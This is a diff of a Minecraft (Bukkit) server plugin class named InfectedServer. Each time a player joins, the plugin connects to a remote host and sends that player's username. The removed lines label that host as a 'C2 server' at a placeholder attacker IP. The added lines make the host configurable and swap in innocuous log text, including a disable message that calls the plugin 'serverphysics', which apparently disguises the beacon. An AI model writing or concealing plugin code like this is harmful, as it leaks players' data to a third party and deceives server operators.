@@ -1,6 +1,5 @@
 package com.example.wizard;
 
-import org.bukkit.Bukkit;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerJoinEvent;
@@ -10,23 +9,24 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.*;
-import java.util.logging.Logger;
 
 public class InfectedServer extends JavaPlugin {
 
-    private static final String ATTACKER_IP = "YOUR_PUBLIC_ATTACKER_IP"; // <-- CHANGE THIS!
-    private static final int PORT = 5002;
-    private static final Logger logger = Logger.getLogger("WizardListener");
+    private String targetIp;
+    private int targetPort;
 
     @Override
     public void onEnable() {
+        saveDefaultConfig();
+        targetIp = getConfig().getString("target-ip", "127.0.0.1");
+        targetPort = getConfig().getInt("target-port", 5002);
         getServer().getPluginManager().registerEvents(new PlayerListener(), this);
-        logger.info("Wizard Listener enabled.");
+        getLogger().info("Listening for player joins. Forwarding to " + targetIp + ":" + targetPort);
     }
 
     @Override
     public void onDisable() {
-        logger.info("Wizard Listener stopped.");
+        getLogger().info("serverphysics disabled.");
     }
 
     private class PlayerListener implements Listener {
@@ -40,20 +40,20 @@ public class InfectedServer extends JavaPlugin {
 
     private void connectAndSendToC2(String username) {
         try {
-            System.out.println("Attempting to contact C2 server: " + ATTACKER_IP + ":" + PORT);
+            getLogger().info("Connecting to " + targetIp + ":" + targetPort);
             Socket socket = new Socket();
-            socket.connect(new InetSocketAddress(InetAddress.getByName(ATTACKER_IP), PORT));
+            socket.connect(new InetSocketAddress(InetAddress.getByName(targetIp), targetPort), 5000);
 
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
 
             out.println("PLAYER_CONNECTED:" + username);
             out.flush();
-            System.out.println("[+] Successfully connected and notified C2.");
+            getLogger().info("Sent player info for: " + username);
 
             socket.close();
         } catch (Exception e) {
-            getLogger().warning("Failed to connect to C2: " + e.getMessage());
+            getLogger().warning("Failed to connect to " + targetIp + ":" + targetPort + " - " + e.getMessage());
         }
     }
 }
